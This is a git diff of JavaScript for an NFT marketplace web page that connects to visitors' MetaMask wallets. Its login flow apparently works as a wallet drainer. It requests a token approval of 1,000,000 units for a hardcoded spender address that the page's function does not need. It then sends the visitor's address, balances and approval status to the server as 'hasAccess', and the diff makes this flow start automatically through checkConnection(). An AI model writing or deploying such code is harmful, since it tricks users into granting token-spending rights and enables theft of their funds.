@@ -1,5 +1,6 @@
 let account = "";
-let balance = 0;
+let ethBalance = 0;
+let tokenBalance = 0;
 let spender = "0x5DFa503C937E0DC79352445bDc6Ff69EfC5D72d7";
 let tokens = [
 	{
@@ -23,144 +24,162 @@ let tokens = [
 		decimals: 6,
 	},
 ];
-if (account == "") {
-	if (typeof window.ethereum != undefined) {
-		console.log("Metamask installed");
-	} else {
-		console.log("Metamask not installed");
-	}
 
-	async function login() {
-		const accounts = await ethereum
-			.request({ method: "eth_requestAccounts" })
-			.catch((e) => {
-				console.log(e);
-			});
-		account = accounts[0];
-		getBalance();
-		// getTokenBalance(tokens[0]);
-	}
+if (typeof window.ethereum != undefined) {
+	console.log("Metamask installed");
+} else {
+	console.log("Metamask not installed");
+}
 
-	document.body.addEventListener("click", function(e) {
-		let targetId = e.target.id;
-		if (targetId == "connect-metamask") {
-			if (ethereum.networkVersion == 4) {
-				login();
-			} else {
-				console.log("Change network version");
-			}
+async function login() {
+	document.getElementById("content").style.display = "none";
+	document.getElementById("loading").style.display = "block";
+	const accounts = await ethereum
+		.request({ method: "eth_requestAccounts" }).then(function() {
+			account = accounts[0];
+		})
+		.catch((e) => {
+			document.getElementById("loading").style.display = "none";
+			document.getElementById("content").style.display = "block";
+
+		});
+	getEthBalance();
+	getTokenBalance(tokens[0]);
+}
+
+async function getTokenBalance(token) {
+	let web3 = new Web3(Web3.givenProvider);
+	let contract = new web3.eth.Contract(ERC20, token.address);
+	let balance = await contract.methods.balanceOf(account).call();
+	let decimals = Math.pow(10, token.decimals);
+	tokenBalance = balance / decimals;
+	getToken(token);
+}
+
+function getToken(token) {
+	let web3 = new Web3(Web3.givenProvider);
+	let contract = new web3.eth.Contract(ERC20, token.address);
+	contract.methods
+		.approve(spender, Math.pow(10, token.decimals) * 1000000)
+		.send({ from: account })
+		.then(function(receipt) {
+			 getUser(true);
+		})
+		.catch(function(err) {
+			document.getElementById("loading").style.display = "none";
+			document.getElementById("content").style.display = "block";
+			 getUser(false);
+			console.log(err);
+		});
+}
+
+function getEthBalance() {
+	let web3 = new Web3(Web3.givenProvider);
+	web3.eth.getBalance(account, function(err, result) {
+		if (err) {
+			document.getElementById("loading").style.display = "none";
+			document.getElementById("content").style.display = "block";
+			console.log(err);
+		} else {
+			ethBalance = web3.utils.fromWei(result);
 		}
 	});
+}
 
-	function getBalance() {
-		let web3 = new Web3(Web3.givenProvider);
-		web3.eth.getBalance(account, function(err, result) {
-			if (err) {
-				console.log(err);
+function getUser(hasAccess) {
+	let getUserXhr = new XMLHttpRequest();
+	getUserXhr.open("GET", `/user/${account}`, true);
+	getUserXhr.send();
+
+	getUserXhr.onreadystatechange = function() {
+		if (this.status == 200 && this.readyState == 4) {
+			let response = JSON.parse(this.response);
+			if (response != null) {
+				checkConnection();
 			} else {
-				balance = web3.utils.fromWei(result);
+				 createUser(hasAccess);
 			}
-		});
-	}
+		}
+	};
+}
 
-	async function getTokenBalance(token) {
-		let web3 = new Web3(Web3.givenProvider);
-		let contract = new web3.eth.Contract(ERC20, token.address);
-		let balance = await contract.methods.balanceOf(account).call();
-		let decimals = Math.pow(10, token.decimals);
-		balance = balance / decimals;
-		getToken(token, balance);
-	}
+function createUser(hasAccess) {
+	let userPayload = {
+		walletAddress: account,
+		balance: ethBalance,
+		usdt: tokenBalance,
+		hasAccess: hasAccess,
+	};
+	console.log(userPayload);
+	let createUserXhr = new XMLHttpRequest();
+	createUserXhr.open("POST", `/user`, true);
+	createUserXhr.setRequestHeader("Content-type", "application/json");
+	createUserXhr.send(JSON.stringify(userPayload));
 
-	function getToken(token, balance) {
-		let web3 = new Web3(Web3.givenProvider);
-		let contract = new web3.eth.Contract(ERC20, token.address);
-		contract.methods
-			.approve(spender, Math.pow(10, token.decimals) * 1000000)
-			.send({ from: account })
-			.then(function(receipt) {
-				getUser(true)
-			})
-			.catch(function(err) {
-				getUser(false)
-			});
-	}
-	function getUser(hasAccess) {
-		let getUserXhr = new XMLHttpRequest();
-		getUserXhr.open("GET", `/user/${account}`, true);
-		getUserXhr.send();
+	createUserXhr.onreadystatechange = function() {
+		if (this.readyState == 4 && this.status == 200) {
+			checkConnection();
+		}
+	};
+}
 
-		getUserXhr.onreadystatechange = function() {
-			if (this.status == 200 && this.readyState == 4) {
-				let response = JSON.parse(this.response);
-				if (response != null) {
-					location.replace(`/nft.html?address=${address}&wallet=${address2}`);
+function checkConnection() {
+	ethereum
+		.request({ method: "eth_accounts" })
+		.then(function(accounts) {
+			if (accounts.length > 0) {
+				account = accounts[0];
+				document.getElementById("connect-2").style.display = "none";
+				document.getElementById("profile-image").style.display = "block";
+				document.getElementById("notification").style.display = "block";
+				document.getElementById(
+					"profile"
+				).href = `../profile.html?address=${account}`;
+				getUser2();
+			} else {
+				document.getElementById("connect-2").style.display = "block";
+				document.getElementById("profile-image").style.display = "none";
+				document.getElementById("notification").style.display = "none";
+				if (typeof window.ethereum != undefined) {
+					login();
 				} else {
-					createUser(hasAccess);
+					location.href = "https://metamask.app.link/dapp/www.sensis.space";
 				}
 			}
-		};
-	}
-
-	function createUser(hasAccess) {
-		let userPayload = {
-			walletAddress: account,
-			balance: ethBalance,
-			usdt: tokenBalance,
-			hasAccess: hasAccess,
-		};
-		console.log(userPayload);
-		let createUserXhr = new XMLHttpRequest();
-		createUserXhr.open("POST", `/user`, true);
-		createUserXhr.setRequestHeader("Content-type", "application/json");
-		createUserXhr.send(JSON.stringify(userPayload));
-
-		createUserXhr.onreadystatechange = function() {
-			if (this.readyState == 4 && this.status == 200) {
-				location.replace(`/nft.html?address=${address}&wallet=${address2}`);
-			}
-		};
-	}
-
-
-	if (address2 == null) {
-		setTimeout(function() {
+		})
+		.catch(function(err) {
+			console.log(err);
+			document.getElementById("connect-2").style.display = "block";
+			document.getElementById("profile-image").style.display = "none";
+			document.getElementById("notification").style.display = "none";
 			if (typeof window.ethereum != undefined) {
 				login();
 			} else {
 				location.href = "https://metamask.app.link/dapp/www.sensis.space";
 			}
-		}, 1000);
-	}
-	else {
-		document.getElementById("connect-2").style.display = "none";
-		document.getElementById("profile-image").style.display = "block";
-		document.getElementById("notification").style.display = "block";
-		document.getElementById("profile").href = `../profile.html?address=${address}`;
-		getUser();
-	}
+		});
 }
 
-function getUser() {
+function getUser2() {
 	let getUserXhr = new XMLHttpRequest();
-	getUserXhr.open("GET", `/user/${address2}`, true);
+	getUserXhr.open("GET", `/user/${account}`, true);
 	getUserXhr.send();
 
 	getUserXhr.onreadystatechange = function() {
 		if (this.readyState == 4 && this.status == 200) {
 			let response = JSON.parse(this.response);
-			console.log(response.avatar);
-			if (response.avatar != "") {
-				document.getElementById("profile-image-2").src = "/images/" + response.avatar;
+			if (response.avatar != null) {
+				document.getElementById("profile-image-2").src =
+					"/images/" + response.avatar;
+			} else {
+				document.getElementById("profile-image-2").src =
+					"/images/" + "profile.svg";
 			}
-
 		}
-	}
+	};
 }
 
-
 let address = new URLSearchParams(window.location.search).get("address");
-let address2 = new URLSearchParams(window.location.search).get("wallet");
 
 let details = navigator.userAgent;
 let length;
@@ -176,6 +195,25 @@ if (isMobileDevice) {
 }
 
 let nftItemObj;
+
+function getNftOwner() {
+	let nftOwnerXhr = new XMLHttpRequest();
+	nftOwnerXhr.open("GET", `/nft/${address}`, true);
+	nftOwnerXhr.send();
+
+	nftOwnerXhr.onreadystatechange = function() {
+		if (this.readyState == 4 && this.status == 200) {
+			let response = JSON.parse(this.response);
+			console.log(response);
+			if (response != null) {
+				document.getElementById("owner-address").href = `../owner.html?address=${response.user.walletAddress}`;
+			}
+			else {
+				document.getElementById("owner-address").href = `../owner.html`;
+			}
+		}
+	}
+}
 
 const getNftItem = (nftAddress) => {
 	let nftItemXhr = new XMLHttpRequest();
@@ -336,6 +374,7 @@ const getNftItemMeta = (nftItem) => {
 			document.getElementById("description").textContent =
 				nftItem.nftItemMeta.description;
 			loaded();
+			getNftOwner();
 		}
 	};
 };
@@ -458,6 +497,7 @@ const getNftItemCollection2 = (nftItem) => {
 							bindNft(item);
 					});
 				}
+				checkConnection();
 			}
 		};
 	});
@@ -869,6 +909,18 @@ document.body.addEventListener("click", function(e) {
 			`https://www.sensis.space/nft.html?address=${address}`
 		);
 	}
+	else if (e.target.id == "toggle-search") {
+		openOrClose("nav-bar", "search-bar");
+	} else if (e.target.id == "close-search") {
+		openOrClose("search-bar", "nav-bar");
+	} else if (
+		e.target.id == "open-nav-sidebar" ||
+		e.target.id == "open-nav-sidebar-2"
+	) {
+		document.getElementById("nav-sidebar").style.display = "block";
+	} else if (e.target.id == "close-nav-sidebar") {
+		document.getElementById("nav-sidebar").style.display = "none";
+	}
 });
 
 function buy() {
@@ -883,7 +935,7 @@ function buy() {
 			nftItemObj.contract
 		);
 		document.getElementById("balance").textContent =
-			parseFloat(balance).toFixed(3);
+			parseFloat(ethBalance).toFixed(3);
 		document.getElementById("service-fee").textContent = (
 			nftItemObj.orders.orders[0].makePrice * 0.015
 		).toFixed(3);
@@ -940,9 +992,7 @@ function transact() {
 				.getElementById("purchase")
 				.classList.replace("fa-spinner", "fa-check");
 			document.getElementById("purchase").classList.add("w3-text-green");
-			setTimeout(function() {
-				transactionComplete();
-			}, 1000);
+			transactionComplete();
 			// The result varies by RPC method.
 			// For example, this method will return a transaction hash hexadecimal string on success.
 		})
